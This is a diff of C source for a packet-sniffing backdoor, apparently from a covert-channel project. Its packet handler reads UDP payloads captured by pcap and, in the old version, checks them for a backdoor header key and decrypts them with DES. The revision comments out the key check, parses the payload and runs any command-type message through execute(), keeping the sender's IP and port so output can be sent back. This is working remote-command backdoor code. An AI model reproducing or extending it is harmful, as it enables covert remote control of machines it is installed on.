@@ -67,49 +67,41 @@ void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
 
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
 {
-	int len;
 	char *ptr;
-	char *decryptMsg;
-	char *command;
+	char *data;
+	char type;
 	int duplex = (int) user;
-	u_int32_t ip;
+	uint32 ip;
 	short port;
 	int hdr_len;
+	int len;
 
 	hdr_len = strlen(HDR_KEY);
 
 	/* Step 1: locate the payload portion of the packet */
 	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
-
-	if (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len <= 0)
+	if (pkt_info->caplen - ETHER_IP_UDP_LEN <= 0)
 		return;
 
-	/* Step 2: check payload for backdoor header key */
+	/* Step 2: check payload for backdoor header key
 	if (0 != memcmp(ptr, HDR_KEY, hdr_len))
+		return; */
+
+	len = pkt_info->caplen - ETHER_IP_UDP_LEN;
+
+	data = getTransmission(ptr, &len, &type);
+	if (data == NULL)
 		return;
 
-	ptr += hdr_len;
-	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len);
+	if (type == CMD_TYP)
+	{
+		// Grab the source in case we need to send the result back
+		ip = *(uint32*)(packet + SRC_OFF);
+		port = *(uint16*)(packet + PORT_OFF);
 
-	decryptMsg = (char *)calloc(1, MAX_LEN);
-
-	// Step 3: decrypt the packet with DES
-	memcpy(decryptMsg, ptr, len);
-
-	decryptMsg = decrypt(PASSKEY, decryptMsg, len);
-
-	// Step 5: extract the remainder
-	command = (char*) calloc(1, MAX_LEN);
-	strncpy(command, ptr, len);
-
-	free(decryptMsg);
-
-	// Grab the source in case we need to send the result back
-	ip = *(u_int32_t*)(packet + SRC_OFF);
-	port = *(u_int16_t*)(packet + PORT_OFF);
-
-	// Step 6: Execute the command
-	execute(command, ip, port, duplex);
+		// Step 6: Execute the command
+		execute(data, ip, port, duplex);
+	}
 }
 
 void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
